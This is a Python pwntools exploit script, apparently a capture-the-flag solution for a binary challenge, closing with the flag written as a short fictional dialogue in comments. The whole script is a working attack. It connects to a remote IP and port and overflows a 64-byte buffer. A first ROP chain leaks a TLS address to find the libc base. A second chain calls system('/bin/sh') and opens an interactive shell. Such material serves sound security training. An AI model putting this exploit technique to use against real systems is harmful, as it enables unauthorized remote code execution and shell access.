#!/usr/bin/env python3

from pwn import *

exe = ELF("./chall_patched")
libc = ELF("./libc.so.6")
ld = ELF("./ld-2.39.so")

context.binary = exe
# context.log_level = 'debug'


def conn():
    if args.LOCAL:
        r = process([exe.path])
        if args.DEBUG:
            gdb.attach(r)
    else:
        r = remote("13.214.217.75",2003)

    return r


def main():
    r = conn()
    rop = ROP(exe)
    rop.raw(b"A" * 64)
    rop.raw(exe.bss() + 0x800)
    rop.raw(exe.plt['gets'])
    rop.raw(exe.plt['gets'])
    rop.raw(exe.plt['puts'])
    rop.raw(0x00000000004011af)

    r.sendline(rop.chain())
    sleep(3)
    r.sendline(p32(0) + b"A"*4 + b"B"*8)
    r.sendline(b"CCCC")
    r.recv(101)
    r.recv(8)
    tls = u64(r.recv(6) + b"\x00\x00")
    log.info(f"tls: {hex(tls)}")
    tls -= 0x740
    # good luck pwning :)
    libc.address = tls + 0x3000
    log.info(f"libc base {hex(libc.address)}")
    rop2 = ROP(libc)
    rdi = rop2.find_gadget(['pop rdi','ret'])[0]
    sh = next(libc.search(b"/bin/sh\x00"))
    ret = rop2.find_gadget(['ret'])[0]
    rop2.raw(b"A" * 64)
    rop2.raw(exe.bss() + 0x500)
    rop2.raw(rdi)
    rop2.raw(sh)
    rop2.raw(ret)
    rop2.raw(libc.sym['system'])
    r.sendline(rop2.chain())

    r.interactive()


if __name__ == "__main__":
    main()

# flag : GEMASTIK{
        # mirai: What virtue is your pursuit?
        # elysia: Hope.
        # mirai: When your plans crumble and death awaits, what good is hope then?
        # elysia: It is everything. The only loss is giving up, all else is a draw with life.
        # mirai: And for those who have? Those who are lost and without a path back?
        # elysia: There is always a path back, if only you hope.
        # }